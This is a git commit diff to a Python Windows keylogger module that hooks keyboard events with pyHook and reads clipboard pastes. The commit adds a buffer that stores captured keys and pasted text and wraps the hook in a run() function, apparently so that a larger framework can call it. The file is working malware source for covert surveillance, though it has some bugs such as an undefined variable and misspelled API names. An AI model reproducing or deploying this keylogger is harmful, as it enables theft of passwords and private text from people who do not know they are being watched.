a42614335043b81883bceda0673a1837e33c6b3c
root <root@localhost.localdomain>
2016-06-04 14:42:09 -0400

    updated logger

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -9,7 +9,7 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
-
+key_buffer = []
 def get_current_process():
     #get a handle for forground window
     hwnd= user32.GetForgroundWindow()
@@ -44,7 +44,7 @@ def get_current_process():
     
 def KeyStroke(event):
     global current_window
-    
+    global key_buffer
     #check if window has changed
     if event.WindowName!= current_window:
         current_window = event.WindowName
@@ -62,16 +62,19 @@ def KeyStroke(event):
             win32cipboard.CloseCipboard()
             
             print "[PASTE] - %s" %(pasted_value)
+            key_buffer.append(pasted_values)
             
         else:
             print "[%s]" %event.Key
-            
+            key_buffer.append(event.Key)
     #pass execution to next hook registered
     return True
 
 #create and register a hook manager
-k1= pyHook.HookManager()
-k1.KeyDown=KeyStroke
-#register the hook and execute forever
-k1.HookKeyboard()
-pythoncom.PumpMessages()
+def run():
+    k1= pyHook.HookManager()
+    k1.KeyDown=KeyStroke
+    #register the hook and execute forever
+    k1.HookKeyboard()
+    pythoncom.PumpMessages()
+    return 
